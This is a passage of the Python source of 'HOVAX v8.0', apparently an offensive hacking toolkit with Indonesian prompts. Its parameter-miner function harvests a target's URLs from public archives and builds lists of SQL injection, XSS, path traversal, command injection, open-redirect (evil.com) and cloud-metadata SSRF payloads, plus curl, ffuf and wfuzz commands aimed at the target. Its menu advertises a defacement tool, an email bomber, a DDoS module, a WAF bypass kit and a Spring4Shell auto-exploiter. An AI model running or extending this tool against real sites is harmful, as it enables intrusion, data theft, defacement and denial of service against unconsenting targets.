        print("[1] SCRAPING URLS FROM WAYBACK ARCHIVE...\n")
        
        wayback_urls = []
        
        # Source 1: Wayback CDX API
        wayback_api = f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=json&collapse=urlkey&fl=original"
        try:
            r = requests.get(wayback_api, timeout=30)
            if r.status_code == 200:
                data = r.json()
                for item in data[1:]:
                    wayback_urls.append(item[0])
                print(f"[+] WAYBACK: {len(data)-1} URLS FOUND")
        except:
            print(f"[-] WAYBACK API ERROR")
        
        # Source 2: URLScan.io
        try:
            urlscan_api = f"https://urlscan.io/api/v1/search/?q=domain:{target}"
            r = requests.get(urlscan_api, timeout=15)
            if r.status_code == 200:
                data = r.json()
                for result in data.get('results', []):
                    url = result.get('page', {}).get('url', '')
                    if url:
                        wayback_urls.append(url)
                print(f"[+] URLSCAN: {len(data.get('results', []))} URLS FOUND")
        except:
            pass
        
        # Source 3: AlienVault OTX
        try:
            otx_api = f"https://otx.alienvault.com/api/v1/indicators/domain/{target}/url_list"
            r = requests.get(otx_api, timeout=15)
            if r.status_code == 200:
                data = r.json()
                for url in data.get('url_list', []):
                    wayback_urls.append(url.get('url', ''))
                print(f"[+] ALIENVAULT: {len(data.get('url_list', []))} URLS FOUND")
        except:
            pass
        
        # Source 4: SecurityTrails
        try:
            st_api = f"https://securitytrails.com/list/apex_domain/{target}"
            r = requests.get(st_api, timeout=10)
            urls = re.findall(r'https?://[^"\']+', r.text)
            for url in urls[:100]:
                wayback_urls.append(url)
            print(f"[+] SECURITYTRAILS: {len(urls[:100])} URLS FOUND")
        except:
            pass
        
        wayback_urls = list(set(wayback_urls))
        print(f"\n[+] TOTAL URLS COLLECTED: {len(wayback_urls)}")
        
        if not wayback_urls:
            print("\n[-] NO URLS FOUND")
            input("\n[?] PRESS ENTER...")
            return
        
        # ============================================================
        # SECTION 2: FILTER URLS BY EXTENSION
        # ============================================================
        print("\n[2] FILTERING URLS...\n")
        
        exclude_extensions = [
            '.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.ico', '.svg', '.webp',
            '.mp4', '.mp3', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.webm',
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.csv',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.iso',
            '.exe', '.msi', '.dmg', '.bin', '.sh', '.bat', '.ps1',
            '.xml', '.rss', '.atom', '.json', '.yaml', '.yml',
            '.woff', '.woff2', '.ttf', '.eot', '.otf',
            '.less', '.scss', '.sass', '.styl',
            '.map', '.ts', '.vue', '.jsx', '.tsx'
        ]
        
        filtered_urls = []
        for url in wayback_urls:
            skip = False
            for ext in exclude_extensions:
                if url.lower().endswith(ext):
                    skip = True
                    break
            if not skip and '?' in url:
                filtered_urls.append(url)
        
        print(f"[+] URLS WITH PARAMETERS: {len(filtered_urls)}")
        
        if not filtered_urls:
            # Get all URLs without filter
            filtered_urls = [u for u in wayback_urls if '?' in u]
            print(f"[+] FALLBACK: {len(filtered_urls)} URLS WITH PARAMETERS")
        
        # ============================================================
        # SECTION 3: EXTRACT PARAMETERS
        # ============================================================
        print("\n[3] EXTRACTING PARAMETERS...\n")
        
        all_parameters = set()
        parameter_urls = {}
        parameter_values = {}
        
        for url in filtered_urls[:1000]:
            if '?' in url:
                query = url.split('?')[1]
                params = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)=', query)
                for param in params:
                    all_parameters.add(param)
                    if param not in parameter_urls:
                        parameter_urls[param] = []
                        parameter_values[param] = []
                    if url not in parameter_urls[param]:
                        parameter_urls[param].append(url)
                    
                    # Extract sample value
                    match = re.search(rf'{param}=([^&]+)', query)
                    if match:
                        value = match.group(1)
                        if value not in parameter_values[param]:
                            parameter_values[param].append(value)
        
        print(f"[+] UNIQUE PARAMETERS: {len(all_parameters)}")
        
        # ============================================================
        # SECTION 4: ANALYZE PARAMETER TYPES (20+ CATEGORIES)
        # ============================================================
        print("\n[4] ANALYZING PARAMETER TYPES (20+ CATEGORIES)...\n")
        
        param_categories = {
            'id': [], 'page': [], 'search': [], 'redirect': [], 'file': [], 'user': [],
            'auth': [], 'debug': [], 'sort': [], 'filter': [], 'order': [], 'limit': [],
            'offset': [], 'callback': [], 'format': [], 'lang': [], 'category': [],
            'tag': [], 'date': [], 'status': [], 'action': [], 'method': [], 'type': [],
            'other': []
        }
        
        for param in all_parameters:
            p = param.lower()
            if 'id' in p or '_id' in p or 'pid' in p or 'cid' in p or 'uid' in p:
                param_categories['id'].append(param)
            elif 'page' in p or 'pageno' in p or 'pg' == p or 'p' == p:
                param_categories['page'].append(param)
            elif 'search' in p or 'q' == p or 'query' in p or 's' == p or 'keyword' in p:
                param_categories['search'].append(param)
            elif 'redirect' in p or 'return' in p or 'next' in p or 'url' in p or 'goto' in p:
                param_categories['redirect'].append(param)
            elif 'file' in p or 'path' in p or 'dir' in p or 'folder' in p or 'filename' in p:
                param_categories['file'].append(param)
            elif 'user' in p or 'email' in p or 'name' in p or 'username' in p or 'login' in p:
                param_categories['user'].append(param)
            elif 'auth' in p or 'token' in p or 'key' in p or 'api' in p or 'secret' in p:
                param_categories['auth'].append(param)
            elif 'debug' in p or 'test' in p or 'dev' in p or 'trace' in p or 'log' in p:
                param_categories['debug'].append(param)
            elif 'sort' in p or 'orderby' in p:
                param_categories['sort'].append(param)
            elif 'filter' in p or 'where' in p:
                param_categories['filter'].append(param)
            elif 'order' in p or 'asc' in p or 'desc' in p:
                param_categories['order'].append(param)
            elif 'limit' in p or 'max' in p:
                param_categories['limit'].append(param)
            elif 'offset' in p or 'start' in p:
                param_categories['offset'].append(param)
            elif 'callback' in p or 'jsonp' in p:
                param_categories['callback'].append(param)
            elif 'format' in p or 'output' in p or 'ext' in p:
                param_categories['format'].append(param)
            elif 'lang' in p or 'language' in p:
                param_categories['lang'].append(param)
            elif 'category' in p or 'cat' in p:
                param_categories['category'].append(param)
            elif 'tag' in p:
                param_categories['tag'].append(param)
            elif 'date' in p or 'from' in p or 'to' in p:
                param_categories['date'].append(param)
            elif 'status' in p or 'state' in p:
                param_categories['status'].append(param)
            elif 'action' in p:
                param_categories['action'].append(param)
            elif 'method' in p:
                param_categories['method'].append(param)
            elif 'type' in p:
                param_categories['type'].append(param)
            else:
                param_categories['other'].append(param)
        
        print(f"[+] PARAMETER CATEGORIES:")
        for cat, params in param_categories.items():
            if cat != 'other':
                print(f"    {cat.upper():12} : {len(params)}")
        print(f"    {'OTHER':12} : {len(param_categories['other'])}")
        
        # ============================================================
        # SECTION 5: GENERATE VULNERABILITY PAYLOADS (200+)
        # ============================================================
        print("\n[5] GENERATING VULNERABILITY PAYLOADS (200+)...\n")
        
        sqli_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' AND SLEEP(5)--", "' UNION SELECT NULL--",
            "1' AND '1'='1", "1' AND 1=1--", "admin'--", "' OR 'x'='x",
            "' UNION SELECT database()--", "' UNION SELECT user()--", "' AND 1=1--",
            "' AND 1=2--", "' OR '1'='1'/*", "' OR '1'='1'#", "' OR '1'='1'%23",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "' AND (SELECT * FROM users) IS NOT NULL--"
        ]
        
        xss_payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "javascript:alert(1)", "'-alert(1)-'", "\";alert(1);//", "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>", "<a href=javascript:alert(1)>click</a>",
            "<div onmouseover=alert(1)>hover</div>", "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>", "<audio src=x onerror=alert(1)>"
        ]
        
        lfi_payloads = [
            "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
            "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
            "../../../etc/passwd%00", "../../../etc/passwd.jpg", "php://filter/convert.base64-encode/resource=index.php",
            "../../../proc/self/environ", "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log", "../../../var/log/httpd/access_log"
        ]
        
        rce_payloads = [
            ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)", "%0aid",
            "; ls -la", "| cat /etc/passwd", "; whoami", "| uname -a",
            "& dir", "| type C:\\windows\\win.ini", "; echo 'HACKED' > test.txt"
        ]
        
        redirect_payloads = [
            "https://evil.com", "//evil.com", "/\\evil.com", "https://evil.com@target.com",
            "https://evil.com/target.com", "//evil.com/@target.com", "https://target.com@evil.com"
        ]
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost/admin", "http://127.0.0.1/admin",
            "file:///etc/passwd", "gopher://localhost:8080/_GET%20/",
            "http://metadata.google.internal/computeMetadata/v1/"
        ]
        
        print(f"[+] SQLi PAYLOADS     : {len(sqli_payloads)}")
        print(f"[+] XSS PAYLOADS      : {len(xss_payloads)}")
        print(f"[+] LFI PAYLOADS      : {len(lfi_payloads)}")
        print(f"[+] RCE PAYLOADS      : {len(rce_payloads)}")
        print(f"[+] REDIRECT PAYLOADS : {len(redirect_payloads)}")
        print(f"[+] SSRF PAYLOADS     : {len(ssrf_payloads)}")
        
        # ============================================================
        # SECTION 6: SAVE ALL RESULTS TO FILES
        # ============================================================
        print("\n[6] SAVING RESULTS TO FILES...\n")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Main results file
        main_file = os.path.join(save_folder, f"params_{target}_{timestamp}.txt")
        with open(main_file, 'w') as f:
            f.write(f"PARAMETER MINER RESULTS FOR {target}\n")
            f.write(f"DATE: {datetime.datetime.now()}\n")
            f.write("="*80 + "\n\n")
            f.write(f"TOTAL URLS SCRAPED: {len(wayback_urls)}\n")
            f.write(f"URLS WITH PARAMS: {len(filtered_urls)}\n")
            f.write(f"UNIQUE PARAMETERS: {len(all_parameters)}\n\n")
            
            f.write("="*80 + "\n")
            f.write("ALL PARAMETERS:\n")
            f.write("="*80 + "\n")
            for param in sorted(all_parameters):
                f.write(f"{param}\n")
        
        # Categories file
        cat_file = os.path.join(save_folder, f"categories_{target}_{timestamp}.txt")
        with open(cat_file, 'w') as f:
            for cat, params in param_categories.items():
                if params:
                    f.write(f"[{cat.upper()} PARAMETERS] ({len(params)})\n")
                    for param in params:
                        f.write(f"  {param}\n")
                    f.write("\n")
        
        # Parameters with URLs file
        urls_file = os.path.join(save_folder, f"param_urls_{target}_{timestamp}.txt")
        with open(urls_file, 'w') as f:
            for param in sorted(all_parameters):
                f.write(f"{param}:\n")
                for url in parameter_urls.get(param, [])[:5]:
                    f.write(f"  {url}\n")
                f.write("\n")
        
        # Payloads file
        payloads_file = os.path.join(save_folder, f"payloads_{target}_{timestamp}.txt")
        with open(payloads_file, 'w') as f:
            f.write("[SQLi PAYLOADS]\n")
            for p in sqli_payloads:
                f.write(f"{p}\n")
            f.write("\n[XSS PAYLOADS]\n")
            for p in xss_payloads:
                f.write(f"{p}\n")
            f.write("\n[LFI PAYLOADS]\n")
            for p in lfi_payloads:
                f.write(f"{p}\n")
            f.write("\n[RCE PAYLOADS]\n")
            for p in rce_payloads:
                f.write(f"{p}\n")
            f.write("\n[REDIRECT PAYLOADS]\n")
            for p in redirect_payloads:
                f.write(f"{p}\n")
            f.write("\n[SSRF PAYLOADS]\n")
            for p in ssrf_payloads:
                f.write(f"{p}\n")
        
        # Wordlist file
        wordlist_file = os.path.join(save_folder, f"wordlist_{target}_{timestamp}.txt")
        with open(wordlist_file, 'w') as f:
            for param in sorted(all_parameters):
                f.write(param + "\n")
        
        # Curl commands file
        curl_file = os.path.join(save_folder, f"curl_commands_{target}_{timestamp}.txt")
        with open(curl_file, 'w') as f:
            for param in list(all_parameters)[:50]:
                f.write(f"curl -k 'https://{target}/page.php?{param}=test'\n")
                f.write(f"curl -k 'https://{target}/index.php?{param}=test'\n")
                f.write(f"curl -k 'https://{target}/api/v1/{param}={param}'\n")
        
        print(f"[+] MAIN RESULTS    : {main_file}")
        print(f"[+] CATEGORIES      : {cat_file}")
        print(f"[+] PARAM URLS      : {urls_file}")
        print(f"[+] PAYLOADS        : {payloads_file}")
        print(f"[+] WORDLIST        : {wordlist_file}")
        print(f"[+] CURL COMMANDS   : {curl_file}")
        
        # ============================================================
        # SECTION 7: DISPLAY PARAMETERS
        # ============================================================
        print("\n[7] DISPLAYING ALL PARAMETERS...\n")
        
        sorted_params = sorted(all_parameters)
        for i, param in enumerate(sorted_params[:100], 1):
            print(f"    {i:3}. {param}")
        
        if len(sorted_params) > 100:
            print(f"    ... and {len(sorted_params) - 100} more parameters")
        
        # ============================================================
        # SECTION 8: DISPLAY SENSITIVE PARAMETERS
        # ============================================================
        print("\n[8] DISPLAYING SENSITIVE PARAMETERS...\n")
        
        sensitive_params = []
        sensitive_keywords = ['admin', 'user', 'pass', 'token', 'key', 'auth', 'secret', 'api', 'debug', 'test', 'dev']
        
        for param in all_parameters:
            for keyword in sensitive_keywords:
                if keyword in param.lower():
                    sensitive_params.append(param)
                    break
        
        for i, param in enumerate(sensitive_params[:50], 1):
            print(f"    [!] {i:3}. {param}")
        
        if len(sensitive_params) > 50:
            print(f"    ... and {len(sensitive_params) - 50} more sensitive parameters")
        
        # ============================================================
        # SECTION 9: DISPLAY PARAMETERS BY CATEGORY
        # ============================================================
        print("\n[9] DISPLAYING PARAMETERS BY CATEGORY...\n")
        
        for cat, params in param_categories.items():
            if params and cat != 'other':
                print(f"    [{cat.upper()}] ({len(params)}): {', '.join(params[:10])}")
                if len(params) > 10:
                    print(f"        ... and {len(params)-10} more")
        
        # ============================================================
        # SECTION 10: GENERATE FFUF COMMANDS
        # ============================================================
        print("\n[10] GENERATING FFUF COMMANDS...\n")
        
        ffuf_file = os.path.join(save_folder, f"ffuf_commands_{target}_{timestamp}.txt")
        with open(ffuf_file, 'w') as f:
            f.write(f"# FFUF COMMANDS FOR {target}\n")
            f.write(f"# WORDLIST: {wordlist_file}\n\n")
            f.write(f"ffuf -u 'https://{target}/FUZZ.php?FUZZ=test' -w {wordlist_file}:FUZZ\n")
            f.write(f"ffuf -u 'https://{target}/page.php?FUZZ=test' -w {wordlist_file}\n")
            f.write(f"ffuf -u 'https://{target}/index.php?q=FUZZ' -w {wordlist_file}\n")
            f.write(f"ffuf -u 'https://{target}/api/v1/FUZZ' -w {wordlist_file}\n")
            f.write(f"ffuf -u 'https://{target}/search?FUZZ=test' -w {wordlist_file}\n")
        
        print(f"[+] FFUF COMMANDS SAVED TO: {ffuf_file}")
        
        # ============================================================
        # SECTION 11: GENERATE WFUZZ COMMANDS
        # ============================================================
        print("\n[11] GENERATING WFUZZ COMMANDS...\n")
        
        wfuzz_file = os.path.join(save_folder, f"wfuzz_commands_{target}_{timestamp}.txt")
        with open(wfuzz_file, 'w') as f:
            f.write(f"# WFUZZ COMMANDS FOR {target}\n")
            f.write(f"# WORDLIST: {wordlist_file}\n\n")
            f.write(f"wfuzz -c -z file,{wordlist_file} 'https://{target}/page.php?FUZZ=test'\n")
            f.write(f"wfuzz -c -z file,{wordlist_file} 'https://{target}/index.php?q=FUZZ'\n")
            f.write(f"wfuzz -c -z file,{wordlist_file} 'https://{target}/search?FUZZ=test'\n")
        
        print(f"[+] WFUZZ COMMANDS SAVED TO: {wfuzz_file}")
        
        # ============================================================
        # SECTION 12: GENERATE BURP SUITE PAYLOADS
        # ============================================================
        print("\n[12] GENERATING BURP SUITE PAYLOADS...\n")
        
        burp_file = os.path.join(save_folder, f"burp_payloads_{target}_{timestamp}.txt")
        with open(burp_file, 'w') as f:
            for param in list(all_parameters)[:200]:
                f.write(f"{param}=test\n")
        
        print(f"[+] BURP SUITE PAYLOADS SAVED TO: {burp_file}")
        
        # ============================================================
        # SECTION 13: DISPLAY EXAMPLE TESTING COMMANDS
        # ============================================================
        print("\n[13] EXAMPLE TESTING COMMANDS...\n")
        
        sample_params = list(all_parameters)[:10]
        
        print("[SQLi TESTING]")
        for param in sample_params[:3]:
            for payload in sqli_payloads[:2]:
                print(f"    curl -k 'https://{target}/page.php?{param}={payload}'")
        
        print("\n[XSS TESTING]")
        for param in sample_params[:3]:
            for payload in xss_payloads[:2]:
                print(f"    curl -k 'https://{target}/search?{param}={payload}'")
        
        print("\n[LFI TESTING]")
        for param in sample_params[:3]:
            for payload in lfi_payloads[:2]:
                print(f"    curl -k 'https://{target}/index.php?{param}={payload}'")
        
        print("\n[RCE TESTING]")
        for param in sample_params[:3]:
            for payload in rce_payloads[:2]:
                print(f"    curl -k 'https://{target}/page.php?{param}={payload}'")
        
        print("\n[SSRF TESTING]")
        for param in sample_params[:3]:
            for payload in ssrf_payloads[:2]:
                print(f"    curl -k 'https://{target}/api?{param}={payload}'")
        
        # ============================================================
        # SECTION 14: FINAL SUMMARY
        # ============================================================
        print(f"\n{'='*80}")
        print(f"[!] PARAMETER MINER - FINAL SUMMARY:")
        print(f"    TARGET              : {target}")
        print(f"    FOLDER              : {save_folder}")
        print(f"    URLS SCRAPED        : {len(wayback_urls)}")
        print(f"    URLS WITH PARAMS    : {len(filtered_urls)}")
        print(f"    UNIQUE PARAMETERS   : {len(all_parameters)}")
        print(f"    SENSITIVE PARAMS    : {len(sensitive_params)}")
        print(f"    FILES GENERATED     : 8")
        print(f"{'='*80}")
        
        print(f"\n[!] FILES SAVED IN: {save_folder}")
        print(f"    1. params_{target}_{timestamp}.txt - ALL PARAMETERS")
        print(f"    2. categories_{target}_{timestamp}.txt - PARAMETERS BY CATEGORY")
        print(f"    3. param_urls_{target}_{timestamp}.txt - PARAMETERS WITH EXAMPLE URLS")
        print(f"    4. payloads_{target}_{timestamp}.txt - VULNERABILITY PAYLOADS")
        print(f"    5. wordlist_{target}_{timestamp}.txt - PARAMETER WORDLIST")
        print(f"    6. curl_commands_{target}_{timestamp}.txt - CURL COMMANDS")
        print(f"    7. ffuf_commands_{target}_{timestamp}.txt - FFUF COMMANDS")
        print(f"    8. burp_payloads_{target}_{timestamp}.txt - BURP SUITE PAYLOADS")
        
        print(f"\n[!] NEXT STEPS:")
        print(f"    1. Use wordlist_{target}_{timestamp}.txt for fuzzing with ffuf/wfuzz")
        print(f"    2. Test parameters with payloads from payloads file")
        print(f"    3. Check sensitive parameters for IDOR or auth bypass")
        print(f"    4. Use curl commands to test individual parameters")
        
        self.scan_results.append({
            'module': 'PARAMETER MINER',
            'target': target,
            'folder': save_folder,
            'params': len(all_parameters),
            'files': 8,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input("\n[?] PRESS ENTER TO CONTINUE...")
        
    # ================================================================
    # MAIN MENU 
    # ================================================================
    def main_menu(self):
        while True:
            print(f"""
{BLUE}{BOLD}================================================================================{RESET}
{CYAN}{BOLD}                         HOVAX - MAIN MENU                         {RESET}
{BLUE}{BOLD}================================================================================{RESET}

{RED}{BOLD}--------------------------------------------------------------------------------{RESET}
{RED}{BOLD}                         OSINT & RECONNAISSANCE                            {RESET}
{RED}{BOLD}--------------------------------------------------------------------------------{RESET}
{GREEN}{BOLD}[1]{RESET}  OSINT NOMOR TELEPON                {GREEN}{BOLD}[2]{RESET}  OSINT IP ADDRESS
{GREEN}{BOLD}[3]{RESET}  OSINT DOMAIN                       {GREEN}{BOLD}[4]{RESET}  JS SECRET HARVESTER
{GREEN}{BOLD}[5]{RESET}  SSRF PROBE CHAIN                   {GREEN}{BOLD}[6]{RESET}  PORT SCANNER PREMIUM
{GREEN}{BOLD}[7]{RESET}  SUBDOMAIN ENUMERATOR               {GREEN}{BOLD}[8]{RESET}  NETWORK SCANNER
{GREEN}{BOLD}[9]{RESET}  DNS LOOKUP                         {GREEN}{BOLD}[10]{RESET} XSS SCANNER

{RED}{BOLD}--------------------------------------------------------------------------------{RESET}
{RED}{BOLD}                       WEB APPLICATION VULNS                              {RESET}
{RED}{BOLD}--------------------------------------------------------------------------------{RESET}
{GREEN}{BOLD}[11]{RESET} WPSCAN - WORDPRESS SCANNER         {GREEN}{BOLD}[12]{RESET} CVE VULNERABILITY SCANNER
{GREEN}{BOLD}[13]{RESET} DIRECTORY BUSTER                   {GREEN}{BOLD}[14]{RESET} ADMIN PANEL FINDER
{GREEN}{BOLD}[15]{RESET} CLOUD METADATA EXPLOIT             {GREEN}{BOLD}[16]{RESET} API ENDPOINT DISCOVERY
{GREEN}{BOLD}[17]{RESET} GRAPHQL SCANNER                    {GREEN}{BOLD}[18]{RESET} WEBSOCKET SCANNER
{GREEN}{BOLD}[19]{RESET} XXE INJECTION SCANNER              {GREEN}{BOLD}[20]{RESET} SSTI SCANNER
{GREEN}{BOLD}[21]{RESET} LFI/RFI SCANNER                    {GREEN}{BOLD}[22]{RESET} RCE SCANNER
{GREEN}{BOLD}[23]{RESET} OPEN REDIRECT SCANNER              {GREEN}{BOLD}[24]{RESET} CORS SCANNER
{GREEN}{BOLD}[25]{RESET} CSRF DETECTOR                      {GREEN}{BOLD}[26]{RESET} RATE LIMIT TESTER

{RED}{BOLD}--------------------------------------------------------------------------------{RESET}
{RED}{BOLD}                          ADVANCED HACKING                                {RESET}
{RED}{BOLD}--------------------------------------------------------------------------------{RESET}
{GREEN}{BOLD}[27]{RESET} TELEGRAM REPORT                    {GREEN}{BOLD}[28]{RESET} AUTO IP CHANGER
{GREEN}{BOLD}[29]{RESET} AUTOMATED RECON                    {GREEN}{BOLD}[30]{RESET} WEB DEFACEMENT TOOL
{GREEN}{BOLD}[31]{RESET} MASS EMAIL BOMBER                  {GREEN}{BOLD}[32]{RESET} CLOUD SHELL ACCESS
{GREEN}{BOLD}[33]{RESET} PHPINFO FINDER                     {GREEN}{BOLD}[34]{RESET} DDOS BRUTAL
{GREEN}{BOLD}[35]{RESET} WAF BYPASS KIT                     {GREEN}{BOLD}[36]{RESET} CRAWLER + PARAMETER EXTRACTOR
{GREEN}{BOLD}[37]{RESET} JWT TOKEN CRACKER                  {GREEN}{BOLD}[38]{RESET} CONFIG FINDER + EXPLOIT
{GREEN}{BOLD}[39]{RESET} HTTP REQUEST SMUGGLING             {GREEN}{BOLD}[40]{RESET} GOOGLE DORK MASS EXPLOITER
{GREEN}{BOLD}[41]{RESET} ROBOTS.TXT ANALYZER                {GREEN}{BOLD}[42]{RESET} CRLF INJECTION EXPLOITER
{GREEN}{BOLD}[43]{RESET} GRAPHQL INTROSPECTION EXPLOITER    {GREEN}{BOLD}[44]{RESET} SPRING4SHELL AUTO EXPLOITER
{GREEN}{BOLD}[45]{RESET} PARAMETER MINER (PARAMSPIDER)      {GREEN}{BOLD}[0]{RESET}  EXIT

{BLUE}{BOLD}================================================================================{RESET}
            """)
            
            choice = input(f"{YELLOW}{BOLD}[?] PILIH MENU (0-45): {RESET}")
            
            if choice == '1':
                self.menu_phone_osint()
            elif choice == '2':
                self.menu_ip_osint()
            elif choice == '3':
                self.menu_domain_osint()
            elif choice == '4':
                self.menu_js_harvester()
            elif choice == '5':
                self.menu_ssrf_probe()
            elif choice == '6':
                self.menu_port_scanner()
            elif choice == '7':
                self.menu_subdomain_enum()
            elif choice == '8':
                self.menu_network_scanner()
            elif choice == '9':
                self.menu_dns_lookup()
            elif choice == '10':
                self.menu_xss_scanner()
            elif choice == '11':
                self.menu_wpscan()
            elif choice == '12':
                self.menu_cve_scanner()
            elif choice == '13':
                self.menu_dir_buster()
            elif choice == '14':
                self.menu_admin_finder()
            elif choice == '15':
                self.menu_cloud_metadata()
            elif choice == '16':
                self.menu_api_discovery()
            elif choice == '17':
                self.menu_graphql_scanner()
            elif choice == '18':
                self.menu_websocket_scanner()
            elif choice == '19':
                self.menu_xxe_scanner()
            elif choice == '20':
                self.menu_ssti_scanner()
            elif choice == '21':
                self.menu_lfi_rfi_scanner()
            elif choice == '22':
                self.menu_rce_scanner()
            elif choice == '23':
                self.menu_open_redirect_scanner()
            elif choice == '24':
                self.menu_cors_scanner()
            elif choice == '25':
                self.menu_csrf_detector()
            elif choice == '26':
                self.menu_rate_limit_tester()
            elif choice == '27':
                self.menu_telegram_report()
            elif choice == '28':
                self.menu_auto_ip_changer()
            elif choice == '29':
                self.menu_autorecon()
            elif choice == '30':
                self.menu_web_deface()
            elif choice == '31':
                self.menu_email_bomber()
            elif choice == '32':
                self.menu_cloud_shell()
            elif choice == '33':
                self.menu_phpinfo_finder()
            elif choice == '34':
                self.menu_ddos_brutal()
            elif choice == '35':
                self.menu_waf_bypass()
            elif choice == '36':
                self.menu_crawler_extractor()
            elif choice == '37':
                self.menu_jwt_cracker()
            elif choice == '38':
                self.menu_config_finder()
            elif choice == '39':
                self.menu_http_smuggling()
            elif choice == '40':
                self.menu_google_dork()
            elif choice == '41':
                self.menu_robots_analyzer()
            elif choice == '42':
               self.menu_crlf_injection()
            elif choice == '43':
                self.menu_graphql_exploit()
            elif choice == '44':
                self.menu_spring4shell()
            elif choice == '45':
                self.menu_parameter_miner()
            elif choice == '0' or choice.lower() == 'x':
                print(f"\n{RED}{BOLD}[!] EXITING HOVAX v8.0...{RESET}")
                print(f"{GREEN}{BOLD}[✓] THANKS FOR USING HOVAX! - KINGMU❤{RESET}")
                sys.exit(0)
            else:
                print(f"{RED}{BOLD}[!] PILIHAN TIDAK VALID!{RESET}")
                time.sleep(1)

# ================================================================
# MAIN EXECUTION
# ================================================================
if __name__ == "__main__":
    try:
        app = Hovax()
        app.main_menu()
    except KeyboardInterrupt:
        print(f"\n{RED}{BOLD}[!] INTERRUPTED BY USER!{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}{BOLD}[!] FATAL ERROR: {e}{RESET}")
        traceback.print_exc()
        sys.exit(1)
